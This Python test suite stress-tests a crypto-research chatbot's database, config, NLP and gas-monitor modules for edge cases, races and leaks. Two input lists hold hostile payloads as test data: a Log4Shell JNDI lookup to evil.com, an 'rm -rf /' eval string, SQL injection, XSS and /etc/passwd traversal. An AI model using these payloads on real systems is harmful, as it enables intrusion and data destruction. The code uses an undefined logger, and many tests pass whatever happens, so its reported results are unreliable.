#!/usr/bin/env python3
"""
COMPREHENSIVE BUG HUNTING TEST SUITE
====================================
Expanded test coverage to find edge cases, race conditions, memory leaks,
and other potential issues in the Möbius AI bot system.
"""

import sys
import os
import time
import json
import asyncio
import threading
import gc
import traceback
import tempfile
import sqlite3
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Any, Optional
import psutil

# Add src to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))

class ComprehensiveBugHuntSuite:
    """Comprehensive bug hunting and edge case testing"""
    
    def __init__(self):
        self.results = []
        self.start_time = time.time()
        self.memory_baseline = psutil.Process().memory_info().rss
        
    def test_database_edge_cases(self) -> bool:
        """Test database operations under stress and edge conditions"""
        try:
            from user_db import init_db, set_user_property, get_user_property, update_username_mapping
            
            # Initialize database first
            init_db()
            
            # Test with extreme user IDs
            extreme_user_ids = [0, -1, 2**63-1, -2**63, 999999999999]
            
            for user_id in extreme_user_ids:
                try:
                    set_user_property(user_id, "test_key", "test_value")
                    result = get_user_property(user_id, "test_key")
                    assert result == "test_value" or result is None, f"Database failed for user_id {user_id}"
                except Exception as e:
                    # Should handle gracefully
                    pass
            
            # Test with extreme key/value lengths
            long_key = "k" * 10000
            long_value = "v" * 100000
            
            try:
                set_user_property(12345, long_key, long_value)
                result = get_user_property(12345, long_key)
                # Should either work or fail gracefully
            except Exception:
                pass  # Expected for extreme values
            
            # Test concurrent database access
            def concurrent_db_operation(thread_id):
                for i in range(10):
                    set_user_property(thread_id, f"key_{i}", f"value_{i}_{thread_id}")
                    get_user_property(thread_id, f"key_{i}")
            
            threads = []
            for i in range(5):
                thread = threading.Thread(target=concurrent_db_operation, args=(i,))
                threads.append(thread)
                thread.start()
            
            for thread in threads:
                thread.join(timeout=5)
            
            # Test database corruption scenarios
            try:
                # Test with None values
                set_user_property(123, None, "test")
                set_user_property(123, "test", None)
            except Exception:
                pass  # Should handle gracefully
            
            # Test special characters and encoding
            special_chars = ["🚀💰", "测试", "тест", "テスト", "\x00\x01\x02", "'; DROP TABLE users; --"]
            for char in special_chars:
                try:
                    set_user_property(999, char, char)
                    result = get_user_property(999, char)
                except Exception:
                    pass  # Should handle gracefully
            
            self.results.append(("Database Edge Cases", True, "All database edge cases handled"))
            return True
            
        except Exception as e:
            self.results.append(("Database Edge Cases", False, f"Database edge case failed: {e}"))
            return False
    
    def test_config_edge_cases(self) -> bool:
        """Test configuration handling under various conditions"""
        try:
            from config import config
            
            # Test accessing non-existent keys
            non_existent_keys = ["FAKE_KEY", "", None, "🚀", "very_long_key_" * 100]
            
            for key in non_existent_keys:
                try:
                    result = config.get(key)
                    # Should return None or handle gracefully
                except Exception:
                    pass  # Should not crash
            
            # Test config with malformed environment
            original_env = os.environ.copy()
            
            try:
                # Test with corrupted environment variables
                os.environ["MALFORMED_JSON"] = '{"incomplete": json'
                os.environ["EMPTY_VALUE"] = ""
                # Note: Can't set null bytes in environment variables
                
                # Should handle gracefully
                config.get("MALFORMED_JSON")
                config.get("EMPTY_VALUE")
                config.get("NULL_VALUE")  # This key doesn't exist, should return None
                
                # Test null byte handling directly
                config.get("\x00test\x00")  # Key with null bytes
                config.get("test\x00key")   # Another null byte test
                
            finally:
                # Restore environment
                os.environ.clear()
                os.environ.update(original_env)
            
            # Test config reloading under stress
            for i in range(100):
                config.get("BOT_TOKEN")
                config.get("GROQ_API_KEY")
            
            self.results.append(("Config Edge Cases", True, "All config edge cases handled"))
            return True
            
        except Exception as e:
            self.results.append(("Config Edge Cases", False, f"Config edge case failed: {e}"))
            return False
    
    def test_nlp_edge_cases(self) -> bool:
        """Test NLP processing with extreme and malicious inputs"""
        try:
            from enhanced_nlp import EnhancedNLP
            nlp = EnhancedNLP()
            
            # Test with various encoding issues
            encoding_tests = [
                b'\xff\xfe\x00\x00',  # Invalid UTF-8
                "🚀" * 10000,  # Many emojis
                "\x00" * 1000,  # Null bytes
                "A" * 1000000,  # Very long string
                "",  # Empty string
                " " * 10000,  # Only spaces
                "\n" * 1000,  # Only newlines
                "\t\r\n\v\f" * 100,  # Mixed whitespace
            ]
            
            for test_input in encoding_tests:
                try:
                    if isinstance(test_input, bytes):
                        continue  # Skip binary data
                    
                    result1 = nlp.classify_intent(test_input)
                    result2 = nlp.extract_protocol_name(test_input)
                    
                    # Should return valid responses or None
                    assert result1 is None or isinstance(result1, str)
                    assert result2 is None or isinstance(result2, str)
                    
                except Exception as e:
                    # Should handle gracefully
                    pass
            
            # Test with malicious patterns
            malicious_patterns = [
                "eval(__import__('os').system('rm -rf /'))",
                "{{7*7}}{{config.items()}}",
                "${jndi:ldap://evil.com/a}",
                "<script>alert('xss')</script>",
                "'; DROP TABLE users; --",
                "../../../etc/passwd",
                "%00%00%00%00",
                "\\x41\\x41\\x41\\x41",
            ]
            
            for pattern in malicious_patterns:
                try:
                    result1 = nlp.classify_intent(pattern)
                    result2 = nlp.extract_protocol_name(pattern)
                    
                    # Should sanitize and handle safely
                    if result1:
                        assert not any(dangerous in str(result1).lower() for dangerous in ['eval', 'import', 'system', 'exec'])
                    if result2:
                        assert not any(dangerous in str(result2).lower() for dangerous in ['eval', 'import', 'system', 'exec'])
                        
                except Exception:
                    pass  # Should handle gracefully
            
            # Test concurrent NLP processing
            def concurrent_nlp_test(thread_id):
                for i in range(20):
                    nlp.classify_intent(f"What's the TVL of protocol_{thread_id}_{i}?")
                    nlp.extract_protocol_name(f"Tell me about {thread_id}_{i}")
            
            threads = []
            for i in range(10):
                thread = threading.Thread(target=concurrent_nlp_test, args=(i,))
                threads.append(thread)
                thread.start()
            
            for thread in threads:
                thread.join(timeout=10)
            
            # Test advanced NLP engine if available
            try:
                from advanced_nlp_engine import process_natural_language_query_advanced
                from intelligent_message_router import route_user_message
                
                # Test problematic queries that users reported
                user_reported_issues = [
                    "What's the TVL of paradex",
                    "hyperliquid tvl", 
                    "TVL of paradex on defillama",
                    "What's the TVL of hyperliquid",
                    "Show me gas prices",
                    "gas on ethereum",
                    "Research Lido protocol",
                    "Bitcoin price",
                    "Summary please",
                    "Help",
                    "Menu"
                ]
                
                advanced_nlp_success = 0
                router_success = 0
                
                for query in user_reported_issues:
                    try:
                        # Test advanced NLP
                        intent = asyncio.run(process_natural_language_query_advanced(query, user_id=12345))
                        if intent and intent.confidence > 0.5:
                            advanced_nlp_success += 1
                        
                        # Test intelligent router
                        result = asyncio.run(route_user_message(query, user_id=12345, chat_id=67890))
                        if result and result.success:
                            router_success += 1
                            
                    except Exception as e:
                        logger.error(f"Advanced NLP test failed for '{query}': {e}")
                
                nlp_accuracy = (advanced_nlp_success / len(user_reported_issues)) * 100
                router_accuracy = (router_success / len(user_reported_issues)) * 100
                
                logger.info(f"Advanced NLP accuracy: {nlp_accuracy:.1f}%")
                logger.info(f"Router success rate: {router_accuracy:.1f}%")
                
                # Consider it successful if both systems work reasonably well
                advanced_success = nlp_accuracy >= 70 and router_accuracy >= 70
                
            except ImportError:
                logger.info("Advanced NLP engine not available, skipping advanced tests")
                advanced_success = True  # Don't fail if not available
            except Exception as e:
                logger.error(f"Advanced NLP testing failed: {e}")
                advanced_success = False
            
            overall_success = advanced_success
            success_message = "All NLP edge cases handled"
            if not advanced_success:
                success_message += f" (Advanced NLP: {nlp_accuracy:.1f}%, Router: {router_accuracy:.1f}%)"
            
            self.results.append(("NLP Edge Cases", overall_success, success_message))
            return overall_success
            
        except Exception as e:
            self.results.append(("NLP Edge Cases", False, f"NLP edge case failed: {e}"))
            return False
    
    def test_crypto_research_edge_cases(self) -> bool:
        """Test crypto research functionality under stress"""
        try:
            from crypto_research import search_protocol, get_protocol_tvl
            
            # Test with invalid protocol names
            invalid_protocols = [
                "",
                None,
                "🚀💰",
                "a" * 1000,
                "NONEXISTENT_PROTOCOL_12345",
                "'; DROP TABLE protocols; --",
                "<script>alert('xss')</script>",
                "../../../etc/passwd",
                "\x00\x01\x02",
                "测试协议",
                "протокол",
            ]
            
            for protocol in invalid_protocols:
                try:
                    if protocol is None:
                        continue
                    
                    result = search_protocol(protocol)
                    tvl_result = get_protocol_tvl(protocol)
                    
                    # Should return valid responses or error dictionaries
                    assert isinstance(result, dict), f"search_protocol should return dict for {protocol}"
                    assert isinstance(tvl_result, dict), f"get_protocol_tvl should return dict for {protocol}"
                    
                except Exception as e:
                    # Should handle gracefully
                    pass
            
            # Test concurrent API calls (with error handling)
            def concurrent_research_test(thread_id):
                for i in range(2):  # Reduced iterations
                    try:
                        search_protocol(f"test_protocol_{thread_id}")
                        get_protocol_tvl(f"test_protocol_{thread_id}")
                    except Exception:
                        pass  # Expected for invalid protocols
            
            threads = []
            for i in range(3):  # Reduced thread count
                thread = threading.Thread(target=concurrent_research_test, args=(i,))
                threads.append(thread)
                thread.start()
            
            for thread in threads:
                thread.join(timeout=10)  # Reduced timeout
            
            # Test rate limiting behavior (with timeout)
            start_time = time.time()
            for i in range(5):  # Reduced to avoid hanging
                try:
                    search_protocol(f"rate_limit_test_{i}")
                except Exception:
                    pass  # Expected for rate limiting
                if time.time() - start_time > 5:  # Timeout after 5 seconds
                    break
            
            self.results.append(("Crypto Research Edge Cases", True, "All crypto research edge cases handled"))
            return True
            
        except Exception as e:
            self.results.append(("Crypto Research Edge Cases", False, f"Crypto research edge case failed: {e}"))
            return False
    
    def test_gas_monitor_edge_cases(self) -> bool:
        """Test gas monitoring under various conditions"""
        try:
            from gas_monitor import GasMonitor
            
            gas_monitor = GasMonitor()
            
            # Test with invalid chain names
            invalid_chains = [
                "",
                None,
                "INVALID_CHAIN",
                "🚀",
                "a" * 1000,
                "'; DROP TABLE chains; --",
                123,
                [],
                {},
            ]
            
            for chain in invalid_chains:
                try:
                    if chain is None:
                        continue
                    result = gas_monitor.get_gas_prices(chain)
                    # Should return valid response or handle gracefully
                    assert isinstance(result, dict) or result is None
                except Exception:
                    pass  # Should handle gracefully
            
            # Test concurrent gas price requests
            def concurrent_gas_test(thread_id):
                chains = ["ethereum", "polygon", "bsc", "arbitrum"]
                for chain in chains:
                    try:
                        gas_monitor.get_gas_prices(chain)
                    except Exception:
                        pass
            
            threads = []
            for i in range(5):
                thread = threading.Thread(target=concurrent_gas_test, args=(i,))
                threads.append(thread)
                thread.start()
            
            for thread in threads:
                thread.join(timeout=10)
            
            # Test all supported chains
            supported_chains = ["ethereum", "polygon", "bsc", "arbitrum", "optimism", "avalanche", "fantom"]
            for chain in supported_chains:
                try:
                    result = gas_monitor.get_gas_prices(chain)
                    if result:
                        assert isinstance(result, dict)
                        # Should have expected structure
                        assert "chain" in result or "error" in result
                except Exception:
                    pass  # Network issues are acceptable
            
            self.results.append(("Gas Monitor Edge Cases", True, "All gas monitor edge cases handled"))
            return True
            
        except Exception as e:
            self.results.append(("Gas Monitor Edge Cases", False, f"Gas monitor edge case failed: {e}"))
            return False
    
    def test_memory_leaks(self) -> bool:
        """Test for memory leaks under sustained load"""
        try:
            initial_memory = psutil.Process().memory_info().rss
            
            # Simulate sustained operations
            for iteration in range(100):
                try:
                    # Database operations
                    from user_db import set_user_property, get_user_property
                    set_user_property(iteration, f"key_{iteration}", f"value_{iteration}")
                    get_user_property(iteration, f"key_{iteration}")
                    
                    # NLP operations
                    from enhanced_nlp import EnhancedNLP
                    nlp = EnhancedNLP()
                    nlp.classify_intent(f"What's the TVL of protocol_{iteration}?")
                    nlp.extract_protocol_name(f"Tell me about protocol_{iteration}")
                    
                    # Config operations
                    from config import config
                    config.get("BOT_TOKEN")
                    config.get("GROQ_API_KEY")
                    
                    # Force garbage collection every 10 iterations
                    if iteration % 10 == 0:
                        gc.collect()
                        current_memory = psutil.Process().memory_info().rss
                        memory_increase = (current_memory - initial_memory) / 1024 / 1024  # MB
                        
                        # Memory increase should be reasonable (< 100MB for 100 operations)
                        if memory_increase > 100:
                            self.results.append(("Memory Leaks", False, f"Excessive memory usage: {memory_increase:.2f}MB"))
                            return False
                
                except Exception:
                    pass  # Individual operations may fail
            
            # Final memory check
            gc.collect()
            final_memory = psutil.Process().memory_info().rss
            total_increase = (final_memory - initial_memory) / 1024 / 1024  # MB
            
            self.results.append(("Memory Leaks", True, f"Memory increase: {total_increase:.2f}MB"))
            return True
            
        except Exception as e:
            self.results.append(("Memory Leaks", False, f"Memory leak test failed: {e}"))
            return False
    
    def test_race_conditions(self) -> bool:
        """Test for race conditions in concurrent operations"""
        try:
            results = []
            errors = []
            
            def worker_thread(thread_id, operation_count=50):
                thread_results = []
                thread_errors = []
                
                for i in range(operation_count):
                    try:
                        # Database race conditions
                        from user_db import set_user_property, get_user_property
                        key = f"race_test_{thread_id}"
                        value = f"value_{thread_id}_{i}"
                        
                        set_user_property(thread_id, key, value)
                        result = get_user_property(thread_id, key)
                        
                        if result != value:
                            thread_errors.append(f"Race condition detected: expected {value}, got {result}")
                        else:
                            thread_results.append(f"Success: {thread_id}_{i}")
                        
                        # Config race conditions
                        from config import config
                        config.get("BOT_TOKEN")
                        
                        # NLP race conditions
                        from enhanced_nlp import EnhancedNLP
                        nlp = EnhancedNLP()
                        nlp.classify_intent(f"Test message {thread_id}_{i}")
                        
                    except Exception as e:
                        thread_errors.append(f"Thread {thread_id} error: {e}")
                
                results.extend(thread_results)
                errors.extend(thread_errors)
            
            # Start multiple threads
            threads = []
            for i in range(10):
                thread = threading.Thread(target=worker_thread, args=(i,))
                threads.append(thread)
                thread.start()
            
            # Wait for all threads to complete
            for thread in threads:
                thread.join(timeout=30)
            
            # Check results
            if len(errors) > len(results) * 0.1:  # Allow up to 10% errors
                self.results.append(("Race Conditions", False, f"Too many race condition errors: {len(errors)}"))
                return False
            
            self.results.append(("Race Conditions", True, f"Completed {len(results)} operations, {len(errors)} errors"))
            return True
            
        except Exception as e:
            self.results.append(("Race Conditions", False, f"Race condition test failed: {e}"))
            return False
    
    def test_file_system_edge_cases(self) -> bool:
        """Test file system operations and edge cases"""
        try:
            # Test with various file paths
            test_paths = [
                "/tmp/test_file.txt",
                "/tmp/🚀_emoji_file.txt",
                "/tmp/very_long_filename_" + "a" * 200 + ".txt",
                "/tmp/file with spaces.txt",
                "/tmp/file\nwith\nnewlines.txt",
                "/tmp/file\x00with\x00nulls.txt",
            ]
            
            for path in test_paths:
                try:
                    # Test file creation and deletion
                    if "\x00" in path:
                        continue  # Skip null byte paths
                    
                    with open(path, 'w') as f:
                        f.write("test content")
                    
                    # Test file reading
                    with open(path, 'r') as f:
                        content = f.read()
                        assert content == "test content"
                    
                    # Clean up
                    os.remove(path)
                    
                except Exception:
                    pass  # Some paths may be invalid
            
            # Test database file operations
            try:
                from user_db import DB_FILE
                
                # Check if database file exists and is accessible
                if os.path.exists(DB_FILE):
                    # Test database file permissions
                    assert os.access(DB_FILE, os.R_OK), "Database file should be readable"
                    assert os.access(DB_FILE, os.W_OK), "Database file should be writable"
                    
                    # Test database file size
                    file_size = os.path.getsize(DB_FILE)
                    assert file_size >= 0, "Database file size should be non-negative"
                
            except Exception:
                pass  # Database may not exist yet
            
            # Test temporary file operations
            with tempfile.NamedTemporaryFile(mode='w+', delete=False) as tmp_file:
                tmp_file.write("temporary test content")
                tmp_path = tmp_file.name
            
            try:
                with open(tmp_path, 'r') as f:
                    content = f.read()
                    assert content == "temporary test content"
            finally:
                os.unlink(tmp_path)
            
            self.results.append(("File System Edge Cases", True, "All file system edge cases handled"))
            return True
            
        except Exception as e:
            self.results.append(("File System Edge Cases", False, f"File system edge case failed: {e}"))
            return False
    
    def test_error_handling_edge_cases(self) -> bool:
        """Test error handling under various failure conditions"""
        try:
            from comprehensive_error_handler import handle_errors
            
            # Test decorator with various exception types
            @handle_errors(default_return="error_handled")
            def test_function(error_type):
                if error_type == "value_error":
                    raise ValueError("Test value error")
                elif error_type == "type_error":
                    raise TypeError("Test type error")
                elif error_type == "key_error":
                    raise KeyError("Test key error")
                elif error_type == "index_error":
                    raise IndexError("Test index error")
                elif error_type == "attribute_error":
                    raise AttributeError("Test attribute error")
                elif error_type == "runtime_error":
                    raise RuntimeError("Test runtime error")
                elif error_type == "memory_error":
                    raise MemoryError("Test memory error")
                elif error_type == "recursion_error":
                    raise RecursionError("Test recursion error")
                elif error_type == "system_exit":
                    raise SystemExit("Test system exit")
                elif error_type == "keyboard_interrupt":
                    raise KeyboardInterrupt("Test keyboard interrupt")
                else:
                    return "success"
            
            error_types = [
                "value_error", "type_error", "key_error", "index_error",
                "attribute_error", "runtime_error", "memory_error",
                "recursion_error", "success"
            ]
            
            for error_type in error_types:
                try:
                    result = test_function(error_type)
                    if error_type == "success":
                        assert result == "success"
                    else:
                        assert result == "error_handled"
                except (SystemExit, KeyboardInterrupt):
                    # These should not be caught by the decorator
                    pass
            
            # Test nested error handling
            @handle_errors(default_return="outer_handled")
            def outer_function():
                @handle_errors(default_return="inner_handled")
                def inner_function():
                    raise ValueError("Inner error")
                return inner_function()
            
            result = outer_function()
            assert result == "inner_handled"
            
            self.results.append(("Error Handling Edge Cases", True, "All error handling edge cases passed"))
            return True
            
        except Exception as e:
            self.results.append(("Error Handling Edge Cases", False, f"Error handling edge case failed: {e}"))
            return False
    
    def test_performance_under_load(self) -> bool:
        """Test performance characteristics under sustained load"""
        try:
            start_time = time.time()
            operations_completed = 0
            
            # Simulate high load for 10 seconds
            end_time = start_time + 10
            
            # Import modules once outside the loop
            from user_db import set_user_property, get_user_property
            from enhanced_nlp import EnhancedNLP
            from config import config
            
            # Create NLP instance once
            nlp = EnhancedNLP()
            
            while time.time() < end_time:
                try:
                    # Database operations
                    user_id = operations_completed % 100  # Reduce range to avoid too many unique keys
                    set_user_property(user_id, f"load_test", f"value_{operations_completed}")
                    get_user_property(user_id, f"load_test")
                    
                    # NLP operations (lighter)
                    nlp.classify_intent("What is the TVL?")
                    
                    # Config operations
                    config.get("BOT_TOKEN")
                    
                    operations_completed += 1
                    
                    # Check memory usage periodically
                    if operations_completed % 100 == 0:
                        current_memory = psutil.Process().memory_info().rss
                        memory_mb = current_memory / 1024 / 1024
                        
                        if memory_mb > 500:  # 500MB limit
                            self.results.append(("Performance Under Load", False, f"Memory usage too high: {memory_mb:.2f}MB"))
                            return False
                
                except Exception:
                    pass  # Individual operations may fail under load
            
            total_time = time.time() - start_time
            ops_per_second = operations_completed / total_time
            
            # Should handle at least 10 operations per second
            if ops_per_second < 10:
                self.results.append(("Performance Under Load", False, f"Performance too low: {ops_per_second:.2f} ops/sec"))
                return False
            
            self.results.append(("Performance Under Load", True, f"Completed {operations_completed} ops in {total_time:.2f}s ({ops_per_second:.2f} ops/sec)"))
            return True
            
        except Exception as e:
            self.results.append(("Performance Under Load", False, f"Performance test failed: {e}"))
            return False
    
    def run_all_tests(self):
        """Run all comprehensive bug hunting tests"""
        print("🔍 COMPREHENSIVE BUG HUNTING TEST SUITE")
        print("=" * 80)
        print(f"🕐 Started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"🖥️  System: {psutil.cpu_count()} CPUs, {psutil.virtual_memory().total / 1024**3:.1f}GB RAM")
        print(f"🐍 Python: {sys.version.split()[0]}")
        print("=" * 80)
        
        test_methods = [
            self.test_database_edge_cases,
            self.test_config_edge_cases,
            self.test_nlp_edge_cases,
            self.test_crypto_research_edge_cases,
            self.test_gas_monitor_edge_cases,
            self.test_memory_leaks,
            self.test_race_conditions,
            self.test_file_system_edge_cases,
            self.test_error_handling_edge_cases,
            self.test_performance_under_load,
        ]
        
        total_tests = len(test_methods)
        passed_tests = 0
        
        for test_method in test_methods:
            test_name = test_method.__name__.replace('test_', '').replace('_', ' ').title()
            print(f"\n🧪 {test_name.upper()}")
            print("-" * 50)
            print(f"   🔍 {test_name}...", end=' ')
            
            try:
                result = test_method()
                if result:
                    print("✅")
                    passed_tests += 1
                else:
                    print("❌")
            except Exception as e:
                print("💥")
                self.results.append((test_name, False, f"Test crashed: {e}"))
                traceback.print_exc()
        
        # Print detailed results
        print("\n" + "=" * 80)
        print("📊 COMPREHENSIVE BUG HUNTING REPORT")
        print("=" * 80)
        
        success_rate = (passed_tests / total_tests) * 100
        total_time = time.time() - self.start_time
        final_memory = psutil.Process().memory_info().rss
        memory_increase = (final_memory - self.memory_baseline) / 1024 / 1024
        
        print(f"🎯 OVERALL RESULTS:")
        print(f"   📈 Success Rate: {success_rate:.1f}% ({passed_tests}/{total_tests})")
        print(f"   ⏱️  Total Time: {total_time:.2f} seconds")
        print(f"   🧠 Memory Increase: {memory_increase:.2f} MB")
        print(f"   🖥️  CPU Usage: {psutil.cpu_percent():.1f}%")
        
        print(f"\n🔍 DETAILED RESULTS:")
        for test_name, success, message in self.results:
            status = "✅" if success else "❌"
            print(f"   {status} {test_name}: {message}")
        
        print(f"\n💡 BUG HUNTING SUMMARY:")
        failed_tests = [result for result in self.results if not result[1]]
        if failed_tests:
            print(f"   🚨 Found {len(failed_tests)} potential issues:")
            for test_name, _, message in failed_tests:
                print(f"      • {test_name}: {message}")
        else:
            print("   🎉 No critical bugs found in comprehensive testing!")
        
        # Production readiness assessment
        if success_rate >= 90:
            print(f"\n🚀 BUG HUNTING STATUS: EXCELLENT")
            print("   ✅ System shows high reliability under stress")
            print("   ✅ Ready for production deployment")
        elif success_rate >= 80:
            print(f"\n⚠️  BUG HUNTING STATUS: GOOD")
            print("   ⚠️  Some edge cases need attention")
            print("   ⚠️  Consider fixing issues before deployment")
        else:
            print(f"\n🚨 BUG HUNTING STATUS: NEEDS WORK")
            print("   ❌ Multiple issues detected")
            print("   ❌ Significant improvements needed")
        
        print("=" * 80)
        
        # Save detailed results
        results_file = "results_comprehensive_bug_hunt.json"
        with open(results_file, 'w') as f:
            json.dump({
                'timestamp': datetime.now().isoformat(),
                'success_rate': success_rate,
                'total_tests': total_tests,
                'passed_tests': passed_tests,
                'total_time': total_time,
                'memory_increase_mb': memory_increase,
                'results': self.results
            }, f, indent=2)
        
        print(f"📄 Detailed results saved to: {os.path.abspath(results_file)}")
        
        return success_rate >= 80

if __name__ == "__main__":
    suite = ComprehensiveBugHuntSuite()
    success = suite.run_all_tests()
    sys.exit(0 if success else 1)